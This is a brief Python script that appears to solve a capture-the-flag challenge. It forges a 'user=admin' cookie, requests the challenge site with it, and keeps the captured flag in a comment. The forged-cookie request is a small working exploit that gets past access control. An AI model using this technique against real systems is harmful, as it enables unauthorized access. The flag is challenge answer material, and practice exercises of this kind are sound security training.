import requests

url = 'http://recruit.osiris.bar:32005'

cookies = {
    'user': 'admin'
}

session = requests.Session()
session.cookies.update(cookies)

response = session.get(url)
print(response.text)

# flag{coooOooOooOooookieeeeesssSss}
